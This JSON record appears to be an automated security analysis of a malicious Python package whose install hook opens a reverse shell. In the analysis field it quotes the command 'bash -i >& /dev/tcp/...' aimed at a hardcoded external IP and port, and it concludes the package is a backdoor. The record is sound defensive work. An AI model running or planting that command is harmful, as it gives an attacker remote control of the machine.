{
  "purpose": "To define a custom Python package installation process that executes a network connection command post-installation.",
  "sources": "The os.system call within the CustomInstallCommand.run() method.",
  "sinks": "The os.system call executes a bash command that opens a TCP connection to a remote server, potentially leaking data or allowing remote access.",
  "flows": "During package installation, the run() method executes, triggering the os.system call which establishes an outbound TCP connection to 114.116.119.253 on port 7777.",
  "anomalies": "The code uses os.system to execute a bash command that opens a reverse shell to an external IP address. The IP and port are hardcoded; the command is embedded directly in the code. The setup function uses an unusual package name 'gx31ayp0e8kyq9oc'.",
  "analysis": "The script defines a custom installation command that extends the standard install process. After completing the normal installation, it executes a bash command via os.system. The command 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1' creates an interactive reverse shell connection to the specified IP and port. This is a common tactic used in malware to establish remote control over the compromised system. The hardcoded IP and port suggest an attacker-controlled server. The package name appears obfuscated or randomly generated, which can be typical in malicious packages. The use of os.system for executing external commands is risky, especially with embedded network connections, and indicates malicious intent or backdoor functionality.",
  "conclusion": "The code contains a malicious backdoor that initiates a reverse shell connection during installation, indicating high malicious intent. The hardcoded IP address and the reverse shell command are clear signs of malicious behavior. This package should be considered unsafe and potentially harmful.",
